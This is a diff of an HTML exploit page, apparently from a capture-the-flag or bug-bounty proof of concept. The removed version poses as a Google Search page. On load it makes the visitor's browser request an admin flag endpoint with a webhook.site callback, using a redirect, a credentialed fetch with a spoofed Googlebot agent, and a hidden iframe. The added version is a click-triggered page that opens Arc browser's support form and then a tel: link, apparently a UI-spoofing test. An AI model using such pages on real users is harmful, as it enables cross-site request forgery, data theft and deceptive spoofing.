@@ -1,71 +1,17 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Google Search</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f1f1f1;
-            text-align: center;
-            padding: 50px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Google Search</h1>
-    <p>Loading search results...</p>
-    
-    <script>
-        // ====== KONFIGURASI ======
-        // GANTI URL WEBHOOK ANDA DI BAWAH INI!
-        const WEBHOOK_URL = "https://webhook.site/YOUR_UNIQUE_ID_HERE";
-        // =========================
-        
-        console.log("Starting exploit...");
-        
-        // Target URL aplikasi
-        const TARGET_URL = `http://app:3000/admin/flag?callback=${encodeURIComponent(WEBHOOK_URL)}`;
-        
-        // Technique 1: Redirect langsung (paling work)
-        function redirectMethod() {
-            console.log("Executing redirect method...");
-            window.location.href = TARGET_URL;
-        }
-        
-        // Technique 2: Fetch dengan custom headers
-        function fetchMethod() {
-            console.log("Executing fetch method...");
-            fetch(TARGET_URL, {
-                method: 'GET',
-                headers: {
-                    'Referer': 'https://www.google.com/',
-                    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)'
-                },
-                credentials: 'include'
-            }).then(response => {
-                console.log("Fetch successful");
-            }).catch(error => {
-                console.log("Fetch failed, using redirect");
-                redirectMethod();
-            });
-        }
-        
-        // Technique 3: Iframe hidden
-        function iframeMethod() {
-            console.log("Executing iframe method...");
-            const iframe = document.createElement('iframe');
-            iframe.src = TARGET_URL;
-            iframe.style.width = '0';
-            iframe.style.height = '0';
-            iframe.style.border = 'none';
-            document.body.appendChild(iframe);
-        }
-        
-        // Jalankan semua method dengan delay
-        redirectMethod();  // Primary
-        setTimeout(fetchMethod, 500);    // Backup 1
-        setTimeout(iframeMethod, 1000);  // Backup 2
-        
-    </script>
-</body>
+ <head> 
+  <meta charset="utf-8">
+ </head> 
+ <body> 
+
+  <h1>Click anywhere to get contact number from arc browser and wait 5 seconds</h1>
+  <script>
+    addEventListener("click", function a(){
+	window.open('https://resources.arc.net/hc/en-us/requests/new', 'x');
+	setTimeout(function(){
+		window.open('tel:', 'x');
+	}, 5000);
+})
+</script> 
+ </body>
 </html>
